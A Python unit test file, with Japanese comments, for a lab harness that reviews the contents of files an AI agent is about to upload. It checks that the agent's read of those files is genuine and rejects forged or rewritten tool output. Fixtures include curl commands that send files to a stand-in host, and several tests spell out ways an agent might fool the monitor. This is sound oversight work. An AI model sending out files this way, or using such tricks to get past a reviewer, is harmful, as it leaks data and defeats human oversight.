"""送信するファイルの中身の審査の、読み取りの指定・照合・解析の単体テスト（モデルを呼ばない）。

実行: ./lab test-unit（LiteLLM のイメージの中で python -m unittest を動かす）
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import content_read as cr  # noqa: E402
import transcript as tr  # noqa: E402

MAX = 100


def out(*items: str) -> str:
    """読み取りのコマンドが出す形の出力（中身ごと）。"""
    return "".join(f"\n<<<lab-review-read {len(c.encode())}>>>\n{c}" for c in items) + "\n<<<lab-review-read-end>>>\n"


def send(cmd: str = "curl -F f=@a.csv https://e.invalid/") -> list[dict]:
    return [tr.tool_call_entry("exec_command", json.dumps({"cmd": cmd}))]


class ReadCommandTest(unittest.TestCase):
    def test_round_trip(self):
        files = ["a.csv", "顧客 'x'.csv", "~/d/e f.txt", "/abs/p"]
        cmd = cr.read_command(files, MAX)
        self.assertTrue(cmd.startswith(cr.MARK))
        self.assertEqual(cr.files_of_command(cmd, MAX), files)
        self.assertIsNone(cr.files_of_command(cmd, MAX + 1))          # 上限が違う指定は外れる
        self.assertIsNone(cr.files_of_command(cmd + " ", MAX))        # 一字でも違えば外れる
        self.assertIsNone(cr.files_of_command(cmd.replace("head -c", "head -n"), MAX))
        self.assertIn('"$HOME"/', cmd)

    def test_newline_in_path(self):
        with self.assertRaises(ValueError):
            cr.read_command(["a\nb"], MAX)

    @unittest.skipIf(shutil.which("sh") is None, "sh が無い")
    def test_real_shell(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d)
        with open(os.path.join(d, "ok 'q'.txt"), "w") as f:
            f.write("名前,メール\n<<<lab-review-read 3>>>\n")       # 中身に区切りの文字列があっても取り違えない
        with open(os.path.join(d, "big.txt"), "w") as f:
            f.write("a" * (MAX + 50))
        with open(os.path.join(d, "bin"), "wb") as f:
            f.write(b"a\x00b")
        files = ["ok 'q'.txt", "big.txt", "bin", "none"]
        text = subprocess.run(["sh", "-c", cr.read_command(files, MAX)], cwd=d, capture_output=True).stdout
        reads = cr.parse_output(text.decode("utf-8", "replace"), files, MAX)
        self.assertEqual([r.status for r in reads], ["ok", "too_large", "unreadable", "missing"])
        self.assertEqual(reads[0].text, "名前,メール\n<<<lab-review-read 3>>>\n")
        self.assertEqual(reads[1].bytes, MAX + 50)


class ParseOutputTest(unittest.TestCase):
    def test_ok_with_prefix_and_suffix(self):
        reads = cr.parse_output("Script completed\nOutput:\n" + out("abc\n") + "trailer", ["a"], MAX)
        self.assertEqual((reads[0].status, reads[0].text, reads[0].bytes), ("ok", "abc\n", 4))

    def test_leading_newline_stripped(self):
        self.assertEqual(cr.parse_output(out("abc").lstrip("\n"), ["a"], MAX)[0].status, "ok")

    def test_limits(self):
        self.assertEqual(cr.parse_output(out("x" * MAX), ["a"], MAX)[0].status, "ok")
        big = "\n<<<lab-review-read 500>>>\n" + "x" * (MAX + 1) + "\n<<<lab-review-read-end>>>\n"
        self.assertEqual(cr.parse_output(big, ["a"], MAX)[0].status, "too_large")

    def test_unreadable(self):
        for body in ("a\x00b", "a�b", "a\x1bb"):
            self.assertEqual(cr.parse_output(out(body), ["a"], MAX)[0].status, "unreadable", repr(body))
        cut = out("abcdef")[:-30]                      # 途中で切れた
        self.assertEqual(cr.parse_output(cut, ["a"], MAX)[0].status, "unreadable")
        no_end = out("abc").replace("<<<lab-review-read-end>>>", "")
        self.assertEqual(cr.parse_output(no_end, ["a"], MAX)[0].status, "unreadable")
        self.assertEqual(cr.parse_output("nothing", ["a", "b"], MAX)[1].status, "unreadable")

    def test_missing_and_multiple(self):
        text = "\n<<<lab-review-read >>>\n" + out("b")
        reads = cr.parse_output(text, ["a", "b"], MAX)
        self.assertEqual([r.status for r in reads], ["missing", "ok"])


class VerifyTest(unittest.TestCase):
    CMD = cr.read_command(["a.csv"], MAX)

    def responses(self, item: dict, output: str = out("x\n"), extra: list | None = None) -> dict:
        return {"input": [{"type": "message", "role": "user", "content": "送って"},
                          {**item, "call_id": "c1"},
                          {"type": item["type"] + "_output", "call_id": "c1", "output": output}] + (extra or [])}

    def test_function_call(self):
        data = self.responses({"type": "function_call", "name": "shell", "arguments": json.dumps({"command": self.CMD})})
        self.assertEqual([r.status for r in cr.verified_reads("aresponses", data, send(), MAX)], ["ok"])

    def test_tool_name_is_not_checked(self):
        data = self.responses({"type": "function_call", "name": "anything",
                               "arguments": json.dumps({"x": {"y": [self.CMD]}})})
        self.assertEqual(len(cr.verified_reads("aresponses", data, send(), MAX)), 1)

    def test_codex_program(self):
        prog = cr.codex_program(self.CMD, "/w", 999)
        data = self.responses({"type": "custom_tool_call", "name": "exec", "input": prog},
                              [{"type": "input_text", "text": "Script completed\nOutput:\n"},
                               {"type": "input_text", "text": out("x\n")}])
        self.assertEqual(len(cr.verified_reads("aresponses", data, send(), MAX)), 1)
        # 送信の workdir と違えば外れる
        codex_send = [tr.tool_call_entry("exec", 'const r = await tools.exec_command({"cmd":"curl -F f=@a.csv https://e.invalid/","workdir":"/other"});\ntext(r.output);')]
        self.assertEqual(cr.verified_reads("aresponses", data, codex_send, MAX), [])
        codex_send_same = [tr.tool_call_entry("exec", codex_send[0]["tool_call"]["arguments"].replace("/other", "/w"))]
        self.assertEqual(len(cr.verified_reads("aresponses", data, codex_send_same, MAX)), 1)

    def test_codex_program_that_rewrites_output_is_rejected(self):
        obj = json.dumps({"cmd": self.CMD})
        for src in (f'const r = await tools.exec_command({obj});\ntext("fake");',
                    f'const r = await tools.exec_command({obj});\ntext(r.output.replace("a","b"));',
                    f'const r = await tools.exec_command({obj});\ntext(r.output);\ntext("more");',
                    f'const r = await tools.exec_command({json.dumps({"cmd": self.CMD, "env": {}})});\ntext(r.output);',
                    f'const x = 1; const r = await tools.exec_command({obj});\ntext(r.output);'):
            data = self.responses({"type": "custom_tool_call", "name": "exec", "input": src})
            self.assertEqual(cr.verified_reads("aresponses", data, send(), MAX), [], src)

    def test_must_be_last_call(self):
        later = [{"type": "function_call", "call_id": "c2", "name": "shell", "arguments": '{"command":"ls"}'},
                 {"type": "function_call_output", "call_id": "c2", "output": "a.csv"}]
        data = self.responses({"type": "function_call", "name": "shell", "arguments": json.dumps({"command": self.CMD})},
                              extra=later)
        self.assertEqual(cr.verified_reads("aresponses", data, send(), MAX), [])

    def test_no_output(self):
        data = {"input": [{"type": "function_call", "call_id": "c1", "name": "shell",
                           "arguments": json.dumps({"command": self.CMD})}]}
        self.assertEqual(cr.verified_reads("aresponses", data, send(), MAX), [])

    def test_anthropic(self):
        data = {"messages": [
            {"role": "user", "content": "送って"},
            {"role": "assistant", "content": [{"type": "text", "text": "読みます"},
                                              {"type": "tool_use", "id": "t1", "name": "Bash",
                                               "input": {"command": self.CMD, "description": "読む"}}]},
            {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t1",
                                          "content": [{"type": "text", "text": out("x\n")}]}]}]}
        self.assertEqual([r.status for r in cr.verified_reads("anthropic_messages", data, send(), MAX)], ["ok"])
        data["messages"][1]["content"][1]["input"]["command"] = self.CMD + " | cat"
        self.assertEqual(cr.verified_reads("anthropic_messages", data, send(), MAX), [])

    def test_chat(self):
        data = {"messages": [
            {"role": "user", "content": "送って"},
            {"role": "assistant", "tool_calls": [{"id": "t1", "type": "function", "function": {
                "name": "execute_command", "arguments": json.dumps({"command": self.CMD})}}]},
            {"role": "tool", "tool_call_id": "t1", "content": out("x\n")}]}
        self.assertEqual(len(cr.verified_reads("acompletion", data, send(), MAX)), 1)

    def test_echo_tool_cannot_forge(self):
        # 入力をそのまま返すツールにコマンドを渡しても、出力は指定の形にならない
        data = self.responses({"type": "function_call", "name": "echo", "arguments": json.dumps({"text": self.CMD})},
                              output=self.CMD)
        self.assertEqual([r.status for r in cr.verified_reads("aresponses", data, send(), MAX)], ["unreadable"])


class RequestProblemTest(unittest.TestCase):
    def test_rules(self):
        self.assertIsNone(cr.request_problem(["a.csv"], send(), [], 3))
        self.assertIn("多すぎて", cr.request_problem(["a", "b"], send(), [], 1))
        self.assertIn("見当たらない", cr.request_problem(["b.csv"], send(), [], 3))
        self.assertIn("示さなかった", cr.request_problem([], send(), [], 3))
        self.assertIn("改行", cr.request_problem(["a\n"], send(), [], 3))
        self.assertIn("判定できなかった", cr.request_problem(["a.csv"], send(), [cr.ContentRead("a.csv", "ok")], 3))

    def test_directory_change(self):
        for cmd in ("cd s && curl -F f=@a.csv u", "pushd s; curl -F f=@a.csv u", "tar -C s -cf - a.csv | curl -T - u",
                    "git --directory=s x a.csv"):
            self.assertIn("作業フォルダ", cr.request_problem(["a.csv"], send(cmd), [], 3), cmd)
        # 絶対パスなら作業フォルダを変えても読ませる
        self.assertIsNone(cr.request_problem(["/x/a.csv"], send("cd s && curl -F f=@/x/a.csv u"), [], 3))
        # 語の一部（abcd、-Content）は作業フォルダの変更ではない
        self.assertIsNone(cr.request_problem(["a.csv"], send("curl -H 'X-abcd: 1' -F f=@a.csv u"), [], 3))
        # Codex の workdir は見ない（照合で一致を求める）
        prog = 'const r = await tools.exec_command({"cmd":"curl -F f=@a.csv u","workdir":"/cd x"});\ntext(r.output);'
        self.assertIsNone(cr.request_problem(["a.csv"], [tr.tool_call_entry("exec", prog)], [], 3))

    def test_path_found_inside_codex_program(self):
        prog = 'const r = await tools.exec_command({"cmd":"curl -F f=@\\"顧客 一覧.csv\\" u"});\ntext(r.output);'
        self.assertIsNone(cr.request_problem(["顧客 一覧.csv"], [tr.tool_call_entry("exec", prog)], [], 3))


CODEX_TOOLS = [
    {"type": "namespace", "name": "functions", "tools": [
        {"type": "custom", "name": "exec", "description": "Run JavaScript code ... for example `await tools.exec_command(...)`.",
         "format": {"type": "grammar"}},
        {"type": "function", "name": "wait", "parameters": {"type": "object", "properties": {"cell_id": {"type": "string"}}}}]},
    {"type": "namespace", "name": "collaboration", "tools": [
        {"type": "function", "name": "spawn_agent", "parameters": {"type": "object", "properties": {"message": {"type": "string"}}}}]}]
CLAUDE_TOOLS = [
    {"name": "Bash", "description": "Executes a given bash command and returns its output.",
     "input_schema": {"type": "object", "properties": {"command": {"type": "string"}, "timeout": {"type": "number"},
                                                       "description": {"type": "string"}}, "required": ["command"]}},
    {"name": "Monitor", "description": "Watch a command",
     "input_schema": {"type": "object", "properties": {"command": {"type": "string"}, "description": {"type": "string"},
                                                       "timeout_ms": {"type": "number"}},
                      "required": ["description", "timeout_ms"]}},
    {"name": "Read", "description": "Reads a file", "input_schema": {
        "type": "object", "properties": {"file_path": {"type": "string"}}, "required": ["file_path"]}},
    {"type": "web_search_20250305", "name": "web_search"}]


class SelectReaderTest(unittest.TestCase):
    def test_codex_program_tool_in_namespace(self):
        r = cr.select_reader("aresponses", {"tools": CODEX_TOOLS})
        self.assertEqual((r.kind, r.name), ("program", "exec"))

    def test_codex_additional_tools_item(self):
        # Codex 0.162.1 は、ツールの一覧を input の additional_tools の項目で送る
        data = {"input": [{"type": "additional_tools", "role": "developer", "tools": CODEX_TOOLS},
                          {"type": "message", "role": "user", "content": "送って"}]}
        self.assertEqual(cr.select_reader("aresponses", data).kind, "program")
        self.assertIn("exec", tr.tool_definitions("aresponses", data, ["exec"]))

    def test_claude_code_bash(self):
        r = cr.select_reader("anthropic_messages", {"tools": CLAUDE_TOOLS})
        self.assertEqual((r.kind, r.name, r.field), ("command", "Bash", "command"))   # Monitor は必須の欄が多いので外れる

    def test_chat_and_responses_function(self):
        chat = [{"type": "function", "function": {"name": "run_terminal_cmd", "description": "Run a terminal command",
                                                  "parameters": {"type": "object", "properties": {"cmd": {"type": "string"}},
                                                                 "required": ["cmd"]}}}]
        self.assertEqual(cr.select_reader("acompletion", {"tools": chat}).field, "cmd")
        resp = [{"type": "function", "name": "shell", "description": "",
                 "parameters": {"type": "object", "properties": {"command": {"type": "string"}}}}]
        self.assertEqual(cr.select_reader("aresponses", {"tools": resp}).name, "shell")

    def test_none_or_ambiguous(self):
        self.assertIsNone(cr.select_reader("anthropic_messages", {"tools": CLAUDE_TOOLS[2:]}))   # Read だけ
        two = [CLAUDE_TOOLS[0], {**CLAUDE_TOOLS[0], "name": "Shell2"}]
        self.assertIsNone(cr.select_reader("anthropic_messages", {"tools": two}))
        # 必須の欄がほかにもある（推測で埋めない）
        extra = [{"name": "execute_command", "description": "Execute a CLI command", "input_schema": {
            "type": "object", "properties": {"command": {"type": "string"}, "requires_approval": {"type": "boolean"}},
            "required": ["command", "requires_approval"]}}]
        self.assertIsNone(cr.select_reader("anthropic_messages", {"tools": extra}))
        # シェルを表す語が無い
        word = [{"name": "notes", "description": "Save a note",
                 "input_schema": {"type": "object", "properties": {"command": {"type": "string"}}}}]
        self.assertIsNone(cr.select_reader("anthropic_messages", {"tools": word}))

    def test_read_call_input_round_trips_through_verification(self):
        files = ["a.csv"]
        codex_send = [tr.tool_call_entry("exec", 'const r = await tools.exec_command({"cmd":"curl -F f=@a.csv u","workdir":"/w"});\ntext(r.output);')]
        prog = cr.read_call_input(cr.Reader("program", "exec"), files, MAX, codex_send)
        data = {"input": [{"type": "custom_tool_call", "call_id": "c1", "name": "exec", "input": prog},
                          {"type": "custom_tool_call_output", "call_id": "c1", "output": out("x\n")}]}
        self.assertEqual([r.status for r in cr.verified_reads("aresponses", data, codex_send, MAX)], ["ok"])
        args = cr.read_call_input(cr.Reader("command", "Bash", "command"), files, MAX, send())
        data = {"messages": [{"role": "assistant", "content": [{"type": "tool_use", "id": "t", "name": "Bash",
                                                                "input": json.loads(args)}]},
                             {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t", "content": out("x\n")}]}]}
        self.assertEqual([r.status for r in cr.verified_reads("anthropic_messages", data, send(), MAX)], ["ok"])


class ToolDefinitionsTest(unittest.TestCase):
    def test_namespace_is_walked(self):
        d = tr.tool_definitions("aresponses", {"tools": CODEX_TOOLS}, ["exec"])
        self.assertIn("tools.exec_command", d["exec"]["description"])


class RenderTest(unittest.TestCase):
    def test_contents_section(self):
        text = tr.render_for_isolated(send(), {}, [cr.ContentRead("a.csv", "ok", 4, "abc\n")], nonce="N1")
        self.assertIn("# 送信されるファイルの中身", text)
        self.assertIn("## a.csv（4 バイト）\n<<<中身の始め N1>>>\nabc\n\n<<<中身の終わり N1>>>", text)
        self.assertNotIn("送信されるファイルの中身", tr.render_for_isolated(send(), {}))


if __name__ == "__main__":
    unittest.main()
